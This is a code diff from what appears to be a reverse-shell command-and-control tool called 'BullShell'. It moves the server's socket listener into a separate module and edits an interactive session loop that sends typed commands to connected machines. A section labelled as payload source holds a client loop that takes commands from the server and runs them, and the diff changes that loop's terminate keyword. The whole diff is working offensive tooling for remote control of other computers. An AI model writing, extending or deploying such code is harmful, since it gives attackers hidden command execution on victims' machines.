@@ -20,9 +20,11 @@ def depargs() -> dict:
 
 #imports
 from StrFuncs import err, evnt, timenow, beautip, current
-import socket, os, threading
+import socket, os, threading, sys
 from colorama import Fore, Style
 from SessionManager import manager
+sys.path.append(os.path.dirname(os.path.abspath(__file__)))
+from listener import Listen
 
 #interact with session
 def interact(sid: int) -> None:
@@ -36,7 +38,7 @@ def interact(sid: int) -> None:
             command = input(f"{Fore.RED}BullShell>{Style.RESET_ALL}").strip()
             if not command:
                 continue
-            if command == exit:
+            if command == "term":
                 break
             conn.send(command.encode())
             rawstr = conn.recv(1024 * 1024).decode(errors="ignore")
@@ -51,35 +53,13 @@ def interact(sid: int) -> None:
             break
 
 #main function
-def main(ip: str, port: int) -> None:
-    try:
-        s = socket.socket()
-        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        s.bind((ip, port))
-        s.listen(10)
-        print(f"{evnt()} Listening for incoming connection...")
-        def loop():
-            while True:
-                try:
-                    conn, addr = s.accept()
-                    sid = manager.add(conn, addr)
-                    print(f"\r\n{evnt()} {timenow()} New session [{sid}]")
-                    print(f"{current()}", end="", flush=True)
-                except Exception as h:
-                    print(h)
-        threading.Thread(target=loop, daemon=True).start()
-    except Exception as error:
-        print(f"{err()} {error}")
-        import traceback
-        print(f"\n{err()} Error:")
-        traceback.print_exc()
 
 
 #launch func
 def launch(args: dict) -> None:
     ip = args.get("host", "127.0.0.1")
     port = int(args.get("port", 8888))
-    main(ip, port)
+    Listen(ip, port)
     
 
 #source code (only for payloads)
@@ -101,8 +81,8 @@ def connect():
             while True:
                 data = s.recv(1024)
                 command = data.decode("utf-8", errors="ignore")
-                if command.strip() == "kill":
-                    return
+                if command.strip() == "term":
+                    break
                 elif command.startswith("cd "):
                     try:
                         path = data.decode("utf-8")[3:]
